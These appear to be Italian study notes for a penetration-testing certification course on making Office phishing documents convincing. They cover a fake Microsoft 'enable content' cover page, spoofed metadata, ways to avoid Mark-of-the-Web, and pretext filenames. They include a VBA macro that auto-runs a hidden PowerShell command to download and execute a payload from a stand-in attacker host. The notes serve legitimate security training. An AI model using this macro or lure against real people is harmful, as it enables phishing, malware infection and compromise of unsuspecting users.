# 018 — Pretexting Phishing Documents (Client-Side Attacks)

> **Modulo:** Client-Side Attacks · **Video:** 18/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [018_Pretexting Phishing Documents.txt](018_Pretexting Phishing Documents.txt) · [018_Pretexting Phishing Documents.srt](018_Pretexting Phishing Documents.srt)

## Concetti chiave

- **Pretexting nei phishing documents** = costruire il documento in modo che il target sia **convinto di dover** cliccare "Enable Content" / "Enable Editing".
- Due obiettivi: (1) far sembrare il file **non sospetto**; (2) **coercitare** l'enable delle macro.
- Tecnica classica: la macro è già eseguita ma mostra un **finto messaggio "Document edited in earlier version of Word — click Enable Editing/Enable Content to convert"** sopra il contenuto vero.
- Repo di riferimento mostrato nel video: **`office-fish-templates`** (GitHub) — template Word/Excel con macro PoC che lanciano `notepad.exe`.
- Formato consigliato: **`.doc` (97-2003)** → icona old-style, niente badge macro → meno sospetto rispetto a `.docm`/`.xlsm`.
- **Metadata fittizia** coerente col pretexting (autore, company, content type) per ridurre suspicion di chi analizza il file.

## Spiegazione approfondita

### Le 2 regole d'oro
1. Il documento deve **sembrare legittimo** prima dell'enable: lo screen mostrato all'utente con macro disabilitate deve essere coerente con il pretext (es. "resume.doc" → contenuto resume).
2. Il documento deve **convincere ad abilitare le macro**: messaggio fake autorevole (Microsoft-styled), non un foglio bianco.

### Anatomia del template "fake conversion notice"
- Pagina cover full-page con sfondo colorato e logo Word stilizzato.
- Testo grande: *"This document was edited in an earlier version of Microsoft Word. To view this content, please click **Enable Editing** from the yellow bar, then click **Enable Content** to convert the document version."*
- Sotto: contenuto vero (resume, fattura, contratto…) **bianco su bianco** → invisibile fino all'enable.
- Macro `Document_Open` / `AutoOpen` esegue payload + (facoltativo) chiude/rimuove il cover screen.

### Workflow ricreazione
1. Aprire template `office-fish-templates` come riferimento visivo.
2. Nuovo doc Word → copiare lo styling (cover page con `Design → Page Color`).
3. Macros → creare sub `Document_Open()` (richiamando payload) + `AutoOpen()` per legacy.
4. Save As → **97-2003 (.doc)** sul Desktop.
5. Rinominare in modo coerente al pretext (es. `Resume_Alexis.doc`, `Invoice_Q4_2024.doc`, `Contract_Acme.doc`).

### Metadata
- File → Info → Properties → Show All Properties.
- Compilare **Author**, **Company**, **Title** in modo coerente con il pretext.
- Windows tiene traccia di "Origin" → se scaricato da Internet → Office mostra **Protected View** (richiede Enable Editing). Mitigazione: consegna via metodi che non taggano Mark-of-the-Web (link a SMB share, smuggling, USB).

### Pretexts tipici per Office documents
| Pretext | Audience | File name |
|---|---|---|
| Resume / CV | HR / recruiter | `CV_<NomeCandidato>.doc` |
| Invoice / PO | Finance | `Invoice_<NumeroXYZ>.xls` |
| HR policy / leave form | Tutti | `Annual_Leave_Form_2024.doc` |
| Contract draft | Legal / mgmt | `NDA_Draft_v2.doc` |
| Salary review | Tutti | `Salary_Review_Confidential.xls` |
| IT outage report | Tutti | `IT_Maintenance_Report.doc` |

### Difese che inducono uso di pretexting più sofisticato
- **Protected View** per file da Internet/Outlook → utente vede solo Enable Editing prima ancora di Enable Content (2 click invece di 1).
- Mark-of-the-Web (MOTW): zone identifier ADS che blocca esecuzione macro per default su versioni recenti Office.
- Group Policy aziendali che disabilitano macro da fonti esterne.

### Cosa NON fare
- File completamente vuoto sotto al fake notice → analisi superficiale lo svela.
- Pretexting generico ("Important Document — please open") → red flag immediato.
- Nome file con `.docm`/`.xlsm` esplicito → utenti formati riconoscono il badge macro.

## Comandi & strumenti

| Risorsa / Step | Note |
|---|---|
| **office-fish-templates** (GitHub) | Repo template phishing Office |
| Cover styling | Design → Page Color (per match con template) |
| Metadata edit | File → Info → Show All Properties |
| Salvataggio | **97-2003 (.doc)** preferito |
| Macro trigger | `Document_Open()` + `AutoOpen()` (entrambi) |
| Verifica MOTW | `Get-Content file.doc -Stream Zone.Identifier` (PS) |
| Strip MOTH | `Unblock-File` (cmdlet PS, rimuove tag) |

## Esempi pratici

```vba
' Pattern combo: payload + ripristino contenuto (concettuale)
Sub Document_Open()
    RunPayload
    ' Opzionale: nascondere cover, rivelare vero contenuto
End Sub
Sub AutoOpen()
    RunPayload
End Sub
Sub RunPayload()
    Dim ps As String
    ps = "powershell -nop -w hidden -ep bypass -c " & _
         """IEX (iwr 'http://atk/c2.ps1' -UseBasicParsing)"""
    CreateObject("WScript.Shell").Run ps, 0, False
End Sub
```

```
Esempio cover page testo (Italiano-friendly):
─────────────────────────────────────────────────
[Logo Word]
PROTECTED DOCUMENT
This document is encrypted by Microsoft Office.
To view content, please click "Enable Editing" and
then "Enable Content" in the yellow notification
bar above.
─────────────────────────────────────────────────
```

## Punti d'attenzione per l'esame eCPPT

- **Pretexting = social engineering** applicato a documenti, non aspetto tecnico ma fattore #1 di successo phishing.
- Repo iconico: **office-fish-templates** (riferimento del video).
- **`.doc`** (97-2003) > `.docm` per OPSEC: icona non rivela presenza macro.
- Includere **`AutoOpen()` + `Document_Open()`** per compat + reliability.
- **Metadata coerente** col pretext (Author, Company) — riduce sospetto da analisi.
- Pretext canonici: CV, fattura, NDA, HR policy.
- **Protected View** di Office su file con MOTW richiede doppio enable → impatta tasso di successo.
- Combinare con [[017_Using ActiveX Controls for Macro Execution]] per nascondere ulteriormente la presenza di macro.

## Collegamenti con altri video

- Precedente: [[017_Using ActiveX Controls for Macro Execution]]
- Prossimo: [[019_HTML Applications (HTA)]]
- Recap pretexting generale: [[07_Pretexting]]
- Delivery via email: [[08_Phishing with Gophish - Part 1]] · [[09_Phishing with Gophish - Part 2]]
- Payload reali da agganciare: [[014_Weaponizing VBA Macros with MSF]] · [[015_VBA PowerShell Dropper]] · [[016_VBA Reverse Shell Macro with Powercat]].
- Simulazione end-to-end: [[024_Initial Access Via Spear Phishing Attachment]].
